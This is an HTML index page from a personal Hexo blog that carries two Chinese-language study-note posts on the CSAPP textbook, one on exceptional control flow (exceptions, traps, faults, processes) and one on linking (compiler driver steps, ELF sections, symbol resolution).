<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"maple-pwn.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="Maple">
<meta property="og:url" content="http://maple-pwn.github.io/page/3/index.html">
<meta property="og:site_name" content="Maple">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Maple">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://maple-pwn.github.io/page/3/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Maple</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Maple</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Maple’s Blog</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Maple</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">44</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/csapp/8/8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/csapp/8/8/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-27 22:53:38" itemprop="dateModified" datetime="2025-03-27T22:53:38+08:00">2025-03-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CSAPP-第8章-异常控制流"><a href="#CSAPP-第8章-异常控制流" class="headerlink" title="CSAPP 第8章 异常控制流"></a>CSAPP 第8章 异常控制流</h1><p>从给处理器加电开始，直到断电为止，程序计数器假设一个值的序列：<code>a0, a1, ... ,an-1</code>，其中，每个 <code>ak</code> 是某个相应的指令 <code>Ik</code> 的地址。每次从 <code>ak</code> 到 <code>ak+1</code> 的过渡称为控制转移（control transfer），这样的控制转移序列叫做处理器的控制流（flow of control 或 control flow）。</p>
<p>最简单的一种控制流是一个“平滑的”序列，其中每个 <code>Ik</code> 和 <code>Ik+1</code> 在内存中都是相邻的。这种平滑流的<strong>突变</strong>（也就是 <code>Ik+1</code> 与 <code>Ik</code> 不相邻）通常是由诸如跳转、调用和返回这样一些程序指令造成的。这样一些指令都是必要的机制，使得程序能够对由程序变量表示的内部程序状态中的变化做出反应。</p>
<p>但是系统也必须能够对系统状态的变化做出反应，这些系统状态不是被内部程序变量捕获的，而且也不一定要和程序的执行相关。比如，一个硬件定时器定期产生信号，这个事件必须得到处理。包到达网络适配器后，必须存放在内存中。程序向磁盘请求数据，然后休眠，直到被通知说数据已就绪。当子进程终止时，创建这些子进程的父进程必须得到通知。</p>
<p><em>异常控制流</em>（ECF）是指现代系统通过使控制流发生突变来队这些情况做出反应。</p>
<ul>
<li><em>理解ECF可以帮助理解重要的系统概念</em>。ECF是操作系统用来实现I&#x2F;O、进程和虚拟内存的基本机制</li>
<li><em>帮助理解应用程序是如何与操作系统交互的</em>。应用程序通过使用一个叫做*陷阱（trap)<em>或者</em>系统调用（system call)*的ECF形式，向操作系统请求服务。比如，向磁盘写数据、从网络读取数据、创建一个新进程，以及终止当前进程，都是通过应用程序调用系统调用来实现的</li>
<li><em>编写有趣的新应用程序</em>。操作系统为应用程序提供了强大的ECF机制，用来创建新进程、等待进程终止、通知其它进程系统中的异常时间，以及检测和响应这些事件。</li>
<li><em>理解并发</em>。ECF是计算机系统中实现并发的基本机制。在运行中的并发的例子有：中断应用程序执行的异常处理程序，在时间上重叠执行的进程和线程，以及中断应用程序执行的信号处理程序</li>
<li><em>理解软件异常如何工作</em>。C++和Java这样的语言通过try、catch和throw语句来提供软件异常机制。软件异常允许程序进行非本地跳转（即违法通常的调用&#x2F;返回栈规则的跳转）来响应错误情况</li>
</ul>
<h2 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h2><p>异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。具体细节随系统的不同而不同</p>
<p><em>异常</em>就是控制流中的突变，用来响应处理器状态中的某些变化。如图8-1所展示的基本思想</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20250325222501214.png" alt="image-20250325222501214"></th>
</tr>
</thead>
<tbody><tr>
<td>图8-1 异常的剖析。处理器状态中的变化（事件）触发从应用程序到异常处理程序的突发的控制转移。在异常处理程序完成处理后，它将控制返回给被中断的程序或者终止</td>
</tr>
</tbody></table>
<p>当异常处理程序完成后，根据引起异常的事件的类型，会发生以下三种情况的一种</p>
<ol>
<li>处理程序将控制返回给当前程序<em>I<del>current</del></em>,即当事件发生时正在执行的指令</li>
<li>处理程序将控制返回给<em>I<del>next</del></em>,如果当前没有发生异常将会执行的下一条指令</li>
<li>处理程序终止被中断的程序</li>
</ol>
<h3 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h3><p>系统种可能的每种类型的异常都分配了一个唯一的非负整数的<em>异常号</em>。其中一些号码是由处理器的设计者分配的，其它号码是由操作系统<strong>内核</strong>（操作系统常驻内存的部分）的设计者分配的。</p>
<p>在系统启动时，操作系统分配和初始化一张称为<strong>异常表</strong>的跳转表，使得表目k包含异常k的处理程序的地址</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20221012195528624.png" alt="image-20221012195528624"></th>
</tr>
</thead>
<tbody><tr>
<td>图 8-2 异常表</td>
</tr>
</tbody></table>
<p>在运行时（系统执行某个程序时），处理器检测到发生了一个事件，并且确定了异常号k。随后，处理器触发异常，方法是执行间接过程调用，通过异常表的表目k，转到相应的处理程序。图8-3展示了处理器如何使用异常表来形成适当的异常处理程序的地址。异常表的起始地址放在一个叫做<strong>异常表基址寄存器</strong>的特殊CPU寄存器中</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20250325224513356.png" alt="image-20250325224513356"></th>
</tr>
</thead>
<tbody><tr>
<td>图8-3 生成异常处理程序的地址。异常号时异常表中的索引</td>
</tr>
</tbody></table>
<p>异常类似于过程调用，不同之处</p>
<ul>
<li><p>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中。然而，根据异常的类型，返回地址要么时当前指令（当事件发生时正在执行的指令），要么下一条指令</p>
</li>
<li><p><strong>处理器也把一些额外的处理器状态压到栈里，在处理程序返回时，重新开始执行被中断的程序会需要这些状态。</strong></p>
</li>
<li><p>如果控制从用户程序转移到内核，所有这些项目都被压到内核栈中，而不是压到用户栈中</p>
</li>
<li><p>异常处理程序运行在内核模式下，<strong>这意味着它们对所有的系统资源都有完全访问的权限</strong></p>
</li>
</ul>
<h3 id="8-1-2-异常的类型"><a href="#8-1-2-异常的类型" class="headerlink" title="8.1.2 异常的类型"></a>8.1.2 异常的类型</h3><p>异常可以分为四类：中断（interrupt）、陷阱（trap）、故障（fault）和终止（abort）。图 8-4 中的表对这些类别的属性做了小结。</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20221012195839655.png" alt="image-20221012195839655"></th>
</tr>
</thead>
<tbody><tr>
<td>图 8-4 异常的类别 异步异常是由处理器外部的I&#x2F;O设备中的事件产生的。同步异常是执行一条指令的直接产物</td>
</tr>
</tbody></table>
<ol>
<li><p><strong>中断</strong></p>
<p>中断是异步发生的，是来自处理器外部的I&#x2F;O设备的信号的结果。硬件中断不是由任何一条专门的指令造成的，从这个意义上来说它是异步的。硬件中断的异常处理程序常常称为<em>中断处理程序</em></p>
<p>图8-5概括了一个中断的处理。I&#x2F;O设备，例如网络适配器、磁盘控制器和定时芯片，通过向处理器芯片上的一个引脚发信号，并将异常号放到系统总线上，来触发中断，这个异常号标识了引起中断的设备</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20250325230610183.png" alt="image-20250325230610183"></th>
</tr>
</thead>
<tbody><tr>
<td>图8-5 中断处理。中断处理程序将控制返回给应用程序控制流中的下一条指令</td>
</tr>
</tbody></table>
<p>当前指令完成执行之后，处理器注意到中断引脚的电压变高了，就从系统总线读取异常号，然后调用适当的中断处理程序。当处理程序返回时，他就将控制返回下一条指令（也就是如果没有发生中断，在控制流中会在当前指令之后的那条指令）。结果时程序继续执行，就像没有发生过中断一样</p>
</li>
<li><p><strong>陷阱和系统调用</strong></p>
<p>陷阱是有意的异常，是执行一条指令的结果，就像中断处理程序一样，陷阱处理程序将控制返回到下一条指令。陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong></p>
<p>用户程序经常需要向内核请求服务，比如读一个文件（read），创建一个新的进程（fork)、加载一个新的程序（execve)、或者终止当前进程（exit)。为了运行对些内核服务的受控访问，处理器提供了一条特殊的<code>syscall n</code>指令，当用户程序想要请求服务<code>n</code>时，可以执行这条指令。执行<code>syscall</code>指令会导致一个到异常处理程序的陷阱，这个处理程序解析参数，并调用适当的内核程序。图8-6所示</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20250325231602440.png" alt="image-20250325231602440"></th>
</tr>
</thead>
<tbody><tr>
<td>图8-6 陷阱处理。陷阱处理程序将控制返回给应用程序控制流中的下一条指令</td>
</tr>
</tbody></table>
<p>从程序员的角度来看，系统调用和普通的函数调用是一样的。然而，它们的实现非常不同。普通的函数运行在用户模式中，用户模式限制了函数可以执行的指令的类型，而且它们只能访问与调用函数相同的栈。系统调用运行在内核模式中，内核模式允许系统调用执行特权指令，并访问定义在内核中的栈。</p>
</li>
<li><p><strong>故障</strong></p>
<p>故障由错误情况引起，它可能能够被故障处理程序修正。当故障发生时，处理器将控制转移给故障处理程序。如果处理程序能够修正这个错误情况，它就将控制返回到引起故障的指令，从而重新执行它。否则，处理程序返回到内核中的<code>abort</code>例程，<code>abort</code>例程会终止引起故障的应用程序。图8-7概述了一个故障的处理</p>
<table>
<thead>
<tr>
<th><img src="/./image/image-20250327221247420.png" alt="image-20250327221247420"></th>
</tr>
</thead>
<tbody><tr>
<td>图8-7 故障处理。根据故障是否能够被修复，故障处理程序要么重新执行引起故障的指令，要么终止</td>
</tr>
</tbody></table>
<blockquote>
<p>一个经典的故障示例是缺页异常，当指令引用一个虚拟地址，而与该地址相对应的物理页面不在内存中，因此必须从磁盘中取出时，就会发生故障。就像我们将再第9章中看到的那样，一个页面就是虚拟内存的一个连续的块（典型的是4KB）。缺页处理程序从磁盘加载适当的页面，然后将控制返回给引起故障的指令。当指令再次执行时，相应的物理页面已经驻留在内存中了，指令就可以没有故障地运行完成了。</p>
</blockquote>
</li>
<li><p><strong>终止</strong></p>
<p>终止是不可恢复地致命错误造成的结果，通常是一些硬件错误，比如DRAM或者SRAM位被损坏时发生的奇偶错误。终止处理程序从不将控制返回给应用程序。如图8-8所示，处理程序将控制返回给一个<code>abort</code>例程，该例程会终止这个应用程序</p>
</li>
</ol>
<h3 id="8-1-3-Linux-x86-64-系统中的异常"><a href="#8-1-3-Linux-x86-64-系统中的异常" class="headerlink" title="8.1.3 Linux&#x2F;x86-64 系统中的异常"></a>8.1.3 Linux&#x2F;x86-64 系统中的异常</h3><table>
<thead>
<tr>
<th><img src="/./image/image-20250327223230158.png" alt="image-20250327223230158"></th>
</tr>
</thead>
<tbody><tr>
<td>图8-10 Linux x86-64系统中常用的系统调用示例</td>
</tr>
</tbody></table>
<h2 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h2><p>异常是允许操作系统内核提供*进程（process)*概念的基本构造块</p>
<p>进程的经典定义就是一个执行中程序的示例。系统中的每个程序都运行在某个进程的*上下文(context)*中。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的程序的代码和数据，它的栈、通用目的寄存器的内存、程序计数器、环境变量以及打开文件描述符的集合</p>
<p>每次用户通过向shell输入一个可执行目标文件的名字，运行程序时，shell就会创建一个新的进程，然后在这个新进程的上下文中余小宁这个可执行目标文件。应用程序也能够创建新进程，并且在这个新进程的上下文中运行它们自己的代码或其他应用程序</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/csapp/7/7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/csapp/7/7/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-21 00:05:29" itemprop="dateModified" datetime="2025-03-21T00:05:29+08:00">2025-03-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="第7章-链接"><a href="#第7章-链接" class="headerlink" title="第7章 链接"></a>第7章 链接</h1><p>链接（linking)是将各种代码和数据片段收集并组合成为一个单一文件的过程，这个文件可被加载（复制）到内存中并执行</p>
<p>现代系统中，链接是由叫做链接器的程序自动执行的。它们使得分离编译成为可能。我们不用将一个大型的应用程序组织为一个巨大的源文件，而是可以把它分解为更小的、更好管理的模块，可以独立地修改和编译这些模块。当改变这些模块中地一个时，只需要简单地重新编译他，并重新链接应用，而不必重新编译其它文件</p>
<p>为什么学习链接知识：</p>
<ul>
<li>理解链接帮助构造大型程序</li>
<li>理解链接将帮助避免一些危险的编程错误。</li>
<li>理解链接将帮助理解语言的作用域规则是如何实现的</li>
<li>理解链接将帮助理解其它重要的系统概念（加载和运行程序、虚拟内存、分页、内存映射）</li>
<li>可以利用共享库</li>
</ul>
<p><em>环境：<code>linux x86-64</code>操作系统，标准<code>ELF-64</code></em></p>
<h2 id="7-1-编译器驱动程序"><a href="#7-1-编译器驱动程序" class="headerlink" title="7.1 编译器驱动程序"></a>7.1 编译器驱动程序</h2><table>
<thead>
<tr>
<th><img src="/./7_image/image-20221004161258388-1737641944527-6.png" alt="image-20221004161258388-1737641944527-6"></th>
</tr>
</thead>
<tbody><tr>
<td>图 7-1 示例程序 1.</td>
</tr>
</tbody></table>
<p>大多数编译系统提供编译器驱动程序<code>(compiler driver)</code>，它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。</p>
<blockquote>
<p>比如，要通过GNU编译系统构造示例程序，我们就要通过在shell中输入下列命令来驱动GCC驱动程序</p>
<p><code>linux&gt; gcc -Og -o prog main.c sum.c</code></p>
</blockquote>
<table>
<thead>
<tr>
<th align="center"><img src="/./7_image/image-20221004162447905-1737641944527-7.png" alt="image-20221004162447905-1737641944527-7"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">图 7-2 静态链接。链接器将可重定位目标文件组合起来，形成一个可执行目标文件 <code>prog</code>。</td>
</tr>
</tbody></table>
<p>图7-2介概括了驱动程序在将示例程序从ASCII码源文件翻译成可执行目标文件时的行为</p>
<blockquote>
<p>若想看看这些步骤，可以用<code>-v</code>选项来运行GCC</p>
<p>驱动程序首先运行C预处理器（<code>cpp</code>），它将C的源程序<code>main.c</code>翻译成一个ASCII码的中间文件<code>main.i</code>:</p>
<p><code>cpp [other arguments] main.c /tmp/main.i</code></p>
<p>接下来，驱动程序运行C编译器(<code>ccl</code>)，它将<code>main.s</code>翻译成一个ASCII汇编语言文件<code>main.s</code>：</p>
<p><code>ccl /tmp/main.i -Og [other arguments] -o /tmp/main.s</code></p>
<p>然后，驱动程序运行汇编器(<code>as</code>)，它将<code>main.s</code>翻译成一个<em>可重定位目标文件</em><code>main.o</code></p>
<p><code>as [other arguments] -o /tmp/main.o /tmp/main.s</code></p>
<p>驱动程序经过相同的过程生成<code>sum.o</code>，最后，它运行链接器程序<code>ld</code>，将<code>main.o</code>和<code>sum.o</code>以及一些必要的系统目标文件组合起来，创建一个<em>可执行目标文件</em><code>prog</code>：</p>
<p><code>ld -o prog [other object files and args] /tmp/main.o /tmp/sum.o</code></p>
<p>最后生成了名为<code>prog</code>的可执行文件</p>
</blockquote>
<p>shell调用操作系统中一个叫做加载器<code>loader</code>的函数，它将可执行文件<code>prog</code>中的代码和数据复制到内存，然后将控制转移到这个程序的开头</p>
<h2 id="7-2-静态链接"><a href="#7-2-静态链接" class="headerlink" title="7.2 静态链接"></a>7.2 静态链接</h2><p>想<code>Linux LD</code>程序这样的静态链接器以一组可重定位目标文件和命令行参数作为输入，生成一个完全链接的、可以加载和运行的可执行文件作为输出。输入的可重定位目标文件由各种不同的代码和数据节组成，每一节都是一个连续的字节序列。</p>
<p>指令在一节中、初始化了的全局变量在另一节中，而未初始化的变量又在另外一节中。</p>
<p>为了构造可执行文件，连接器必须完成两个主要任务：</p>
<ul>
<li><strong>符号解析</strong>：目标文件定义和引用符号，每个符号对应于一个函数、一个全局变量或一个静态变量。符号解析的目的是将每个符号引用正好和一个符号定义关联起来</li>
<li><strong>重定位</strong>：编译器和汇编器生成从地址0开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置。连接器使用汇编产生的重定位条目的详细指令，不加甄别的执行这样的重定位</li>
</ul>
<p><strong>关于链接器的一些基本事实</strong>：</p>
<ul>
<li>目标文件纯粹是字节块的集合。这些块中，有些包含程序代码，有些包含程序数据，而其它的则包含引导链接器和加载器的数据结构。链接器将这些块连接起来，确定被连接块的运行时位置，并且修改代码和数据块中的各种位置</li>
</ul>
<h2 id="7-3-目标文件"><a href="#7-3-目标文件" class="headerlink" title="7.3 目标文件"></a>7.3 目标文件</h2><p>目标文件有三种形式：</p>
<ul>
<li>可重定位目标文件：包含二进制代码和数据，其形式可以在连接时与其它可重定位目标文件合并起来，创建一个可执行目标文件</li>
<li>可执行目标文件：包含二进制代码和数据，其形式可以被直接复制到内存并执行</li>
<li>共享目标文件：一种特殊类型的可重定位目标文件，可以在加载或者运行时被动态的加载进内存并链接</li>
</ul>
<p>编译器和汇编器生成可重定位目标文件（包括共享目标文件），链接器生成可执行目标文件。从技术上来说，一个目标模块就是一个字节序列，而一个目标文件就是一个以文件形式存放在磁盘中的目标模块，但这些术语会互换地使用</p>
<p>目标文件是按照特定地目标文件格式来组织的，各个系统的目标文件格式都不相同。</p>
<ul>
<li>从贝尔实验室诞生的第一个Unix系统使用的是<code>a.out</code>格式</li>
<li>Windows使用可移植可执行（Portable Executable,PE）格式</li>
<li>Mac-OS-X使用<code>Mach-O</code>格式</li>
<li>现代x86-64 Linux和Unix系统使用可执行可链接格式（ELF）</li>
</ul>
<p><strong>不管哪种格式，基本概念是相似的</strong></p>
<h2 id="7-4-可重定位目标文件"><a href="#7-4-可重定位目标文件" class="headerlink" title="7.4 可重定位目标文件"></a>7.4 可重定位目标文件</h2><table>
<thead>
<tr>
<th align="center"><img src="/./7_image/image-20221005194659449-1737641944528-8.png" alt="image-20221005194659449-1737641944528-8"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">图 7-3 典型的 ELF 可重定位目标文件</td>
</tr>
</tbody></table>
<p>该图展示了一个典型的ELF可重定位目标文件的格式，ELF头以一个16字节的序列开始，这个序列描述了生成该文件的系统的字的大小和字节顺序。ELF头剩下的部分包含帮助链接器语法分析和解释目标文件的信息。其中包括ELF头的大小、目标文件的类型（如可重定位、可执行或者共享的）、机器类型（如x86-64）、节头部表的文件偏移，以及节头部表中条目的大小和数量。不同节的位置和大小是由节头部表描述的，其中目标文件中每个节都有一个固定大小的条目</p>
<p>夹在ELF头和节头部表之间的就是节。一个典型的ELF可重定位目标文件包含下面几个节：</p>
<ul>
<li><code>.text:</code><strong>已编译程序的机器代码</strong></li>
<li><code>.rodata</code>:<strong>只读数据</strong>，比如<code>printf</code>语句中的格式串和开关语句的跳转表</li>
<li><code>.data</code>：<strong>已初始化的全局和静态C变量</strong>。局部C变量在运行时被保存在栈中，既不出现在<code>.data</code>节中，也不出现在<code>.bss</code>节中。</li>
<li><code>.bss</code>:<strong>未初始化的全局和静态C变量</strong>，以及所有被初始化为0的全局或静态变量。在目标文件中这个节不占据实际空间，它仅仅是一个占位符。目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何和实际的磁盘空间。运行时，在内存中分配这些变量，初始值为0</li>
<li><code>.symtab</code>:<strong>符号表</strong>，它存放在程序中定义和引用的函数和全局变量的信息。每个可重定位目标文件<code>.symtab</code>中都有一张符号表。然而，和编译器中的符号表不同，<code>.symtab</code>符号表不包含局部变量的条目</li>
<li><code>.rel.text</code>：<strong>一个<code>.text</code>节中位值的列表</strong>，当链接器把这个目标文件和其它文件组合时，需要修改这些位置。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面，调用本地函数的指令则不需要修改。</li>
<li><code>.rel.data</code>:<strong>被模块引用或定义的所有全局变量的重定位信息</strong>。一般而言任何已初始化的全局变量，如果它的初始值是一个全局变量地址或者外部定义函数的地址，都需要被修改</li>
<li><code>debug</code>:<strong>一个调试符号表</strong>：其条目是程序中定义的局部变量和类型定义，程序中定义和引用的全局变量，以及原始的C源文件。<em>只有以<code>-g</code>选项调用编译器驱动程序时才会得到这张表</em></li>
<li><code>.line</code>：原始C源程序中的行号和<code>.text</code>节中机器指令之间的映射。<em>只有以<code>-g</code>选项调用编译器驱动程序时才会得到这张表</em></li>
<li><code>.strtab</code>:<strong>一个字符串表</strong>，其内容包括<code>.symtab</code>和<code>.debug</code>节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列</li>
</ul>
<h2 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h2><p>每个可重定位的目标模块m都有一个符号表，它包括m定义和引用的符号信息。在链接器的上下文中，有三种不同的符号：</p>
<ul>
<li>由模块m定义并能被其它模块引用的全局符号。全局链接器符号对应于非静态的C函数和全局变量</li>
<li>由其它模块定义并被模块m引用的全局符号。这些符号称为外部符号，对应于在其他模块中定义的非静态C函数和全局变量</li>
<li>只被模块m定义和引用的局部符号。它们对应于带<code>stastic</code>属性的C函数和全局变量。这些符号在模块m中任何位置都可见，但是不能被其它模块引用</li>
</ul>
<p><code>.symtab</code>中的符号表不不包含对应于本地非静态程序变量的任何符号。这些符号在运行时在栈中被管理，链接器对此类符号不感兴趣</p>
<p>定义为带C <code>static</code>属性的本地过程变量是不在栈中管理的。相反，编译器<code>.data</code>或<code>.bss</code>中为每个定义分配空间，并在符号表中创建一个由唯一名字的本地链接器符号</p>
<blockquote>
<p><strong>在C中，源文件扮演模块的角色</strong>，任何带有<code>static</code>属性声明的全局变量或者函数都是模块私有的。任何不带<code>static</code>属性声明的全局变量和函数都是公共的，可以被其它模块访问</p>
</blockquote>
<h2 id="7-6-符号解析"><a href="#7-6-符号解析" class="headerlink" title="7.6 符号解析"></a>7.6 符号解析</h2><p>链接器解析符号引用的方法是：将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来</p>
<h3 id="7-6-1-链接器如何解析多重定义的全局符号"><a href="#7-6-1-链接器如何解析多重定义的全局符号" class="headerlink" title="7.6.1 链接器如何解析多重定义的全局符号"></a>7.6.1 链接器如何解析多重定义的全局符号</h3><p>链接器的输入是一组可重定位目标模块。每个模块定义一组符号，如果多个模块定义同名的全局符号，<code>Linux</code>编译系统会采取以下方法:</p>
<p>在编译时，编译器向汇编器输出每个全局符号，或者是强或者是弱，而汇编器把这个信息隐含地编码在可重定位目标文件的符号表里。<strong>函数和已初始化的全局变量是强符号，未初始化的全局变量是弱符号</strong></p>
<p>根据强弱符号的定义，<code>Linux</code>链接器使用下面的规则来处理多重定义的符号名：</p>
<ul>
<li>不允许有多个同名的强符号</li>
<li>如果有一个强符号和多个弱符号同名，那么选择强符号</li>
<li>如果有多个弱符号同名，从这些弱符号中任意选择一个</li>
</ul>
<p>使用像 <code>GCC-fno-common</code> 标志这样的选项调用链接器，这个选项会告诉链接器，在遇到多重定义的全局符号时，触发一个错误。或者使用 <code>-Werror</code> 选项，它会把所有的警告都变为错误</p>
<h3 id="7-6-2-与静态链接库"><a href="#7-6-2-与静态链接库" class="headerlink" title="7.6.2 与静态链接库"></a>7.6.2 与静态链接库</h3><p>所有的编译系统都提供一种机制，将所有相关的目标模块打包成为一个单独的文件，称为<em>静态库</em>，它可以用作链接器的输入。当链接器构造一个输出的可执行文件时，它只复制静态库里被应用程序引用的目标模块</p>
